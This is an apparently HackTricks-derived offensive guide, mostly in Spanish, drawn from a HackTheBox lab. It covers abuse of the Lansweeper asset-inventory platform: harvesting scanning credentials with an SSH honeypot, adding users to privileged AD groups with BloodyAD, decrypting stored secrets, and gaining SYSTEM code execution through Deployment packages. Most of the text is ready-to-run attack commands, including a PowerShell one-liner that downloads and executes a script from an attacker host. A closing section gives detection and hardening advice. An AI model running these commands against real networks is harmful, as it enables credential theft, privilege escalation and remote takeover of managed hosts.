# Lansweeper Abuse: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper es una plataforma de descubrimiento e inventario de activos IT comúnmente desplegada en Windows e integrada con Active Directory. Las credenciales configuradas en Lansweeper son utilizadas por sus motores de escaneo para autenticarse en activos mediante protocolos como SSH, SMB/WMI y WinRM. Las malas configuraciones con frecuencia permiten:

- Intercepción de credenciales redirigiendo un Scanning Target a un host controlado por el atacante (honeypot)
- Abuso de ACLs de AD expuestas por grupos relacionados con Lansweeper para obtener acceso remoto
- Descifrado en el host de secretos configurados en Lansweeper (connection strings y credenciales de scanning almacenadas)
- Ejecución de código en endpoints gestionados a través de la función Deployment (a menudo ejecutándose como SYSTEM)

Esta página resume flujos de trabajo prácticos y comandos que un atacante puede usar para explotar estos comportamientos durante evaluaciones.

## 1) Recolección de credenciales de escaneo vía honeypot (ejemplo SSH)

Idea: crea un Scanning Target que apunte a tu host y asigna las Scanning Credentials existentes a él. Cuando se ejecute el scan, Lansweeper intentará autenticarse con esas credenciales y tu honeypot las capturará.

Steps overview (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = tu IP de VPN
- Configura el puerto SSH a uno accesible (por ejemplo, 2022 si el 22 está bloqueado)
- Desactiva la programación y planifícalo para ejecutarlo manualmente
- Scanning → Scanning Credentials → asegúrate de que existan credenciales Linux/SSH; asígnalas al nuevo Scanning Target (activa todas según sea necesario)
- Haz clic en “Scan now” en el target
- Ejecuta un honeypot SSH y recupera el usuario/contraseña intentados

Ejemplo con sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Validar las creds capturadas contra los servicios del DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notas
- Funciona de manera similar para otros protocolos cuando puedes hacer que el scanner se conecte a tu listener (honeypots SMB/WinRM, etc.). SSH suele ser lo más sencillo.
- Muchos scanners se identifican con banners de cliente distintos (p. ej., RebexSSH) y probarán comandos benignos (uname, whoami, etc.).

## 2) AD ACL abuse: obtener acceso remoto añadiéndote a un grupo app-admin

Usa BloodHound para enumerar los derechos efectivos de la cuenta comprometida. Un hallazgo común es un grupo específico del scanner o de la app (p. ej., “Lansweeper Discovery”) que tiene GenericAll sobre un grupo privilegiado (p. ej., “Lansweeper Admins”). Si el grupo privilegiado también es miembro de “Remote Management Users”, WinRM estará disponible una vez que nos añadamos.

Ejemplos de recopilación:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Exploit GenericAll en un grupo con BloodyAD (Linux):
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Luego obtén una shell interactiva:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Consejo: las operaciones de Kerberos son sensibles al tiempo. Si recibes KRB_AP_ERR_SKEW, sincronízate con el DC primero:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Desencriptar secretos configurados por Lansweeper en el host

En el servidor de Lansweeper, el sitio ASP.NET suele almacenar una cadena de conexión encriptada y una clave simétrica usada por la aplicación. Con acceso local adecuado, puedes desencriptar la cadena de conexión de la DB y luego extraer las credenciales de escaneo almacenadas.

Ubicaciones típicas:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Clave de la aplicación: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Usa SharpLansweeperDecrypt para automatizar la desencriptación y el volcado de las credenciales almacenadas:
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
El resultado esperado incluye detalles de conexión a la base de datos (DB) y credenciales de escaneo en texto plano, como cuentas de Windows y Linux utilizadas en todo el entorno. Estas a menudo tienen privilegios locales elevados en los hosts del dominio:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Usar Windows scanning creds recuperadas para acceso privilegiado:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Como miembro de “Lansweeper Admins”, la web UI expone Deployment y Configuration. Bajo Deployment → Deployment packages, puedes crear paquetes que ejecutan comandos arbitrarios en activos objetivo. La ejecución la realiza el servicio de Lansweeper con altos privilegios, otorgando ejecución de código como NT AUTHORITY\SYSTEM en el host seleccionado.

High-level steps:
- Crea un nuevo Deployment package que ejecute un one-liner de PowerShell o cmd (reverse shell, add-user, etc.).
- Apunta al asset deseado (por ejemplo, el DC/host donde se ejecuta Lansweeper) y haz clic en Deploy/Run now.
- Captura tu shell como SYSTEM.

Example payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Deployment actions are noisy and leave logs in Lansweeper and Windows event logs. Use judiciously.

## Detección y endurecimiento

- Restringir o eliminar las enumeraciones SMB anónimas. Monitorizar el RID cycling y el acceso anómalo a los shares de Lansweeper.
- Controles de salida (egress): bloquear o restringir estrictamente el tráfico saliente SSH/SMB/WinRM desde los hosts scanner. Alertar sobre puertos no estándar (p. ej., 2022) y banners de cliente inusuales como Rebex.
- Proteger `Website\\web.config` y `Key\\Encryption.txt`. Externalizar secretos en un vault y rotarlos en caso de exposición. Considerar cuentas de servicio con privilegios mínimos y gMSA cuando sea viable.
- Monitoreo de AD: alertar sobre cambios en grupos relacionados con Lansweeper (p. ej., “Lansweeper Admins”, “Remote Management Users”) y sobre cambios de ACL que otorguen membresía GenericAll/Write en grupos privilegiados.
- Auditar la creación/cambios/ejecución de paquetes de Deployment; alertar sobre paquetes que lancen cmd.exe/powershell.exe o conexiones salientes inesperadas.

## Temas relacionados
- Enumeración SMB/LSA/SAMR y RID cycling
- Password spraying en Kerberos y consideraciones sobre clock skew
- Análisis de rutas con BloodHound de grupos application-admin
- Uso de WinRM y movimiento lateral

## Referencias
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
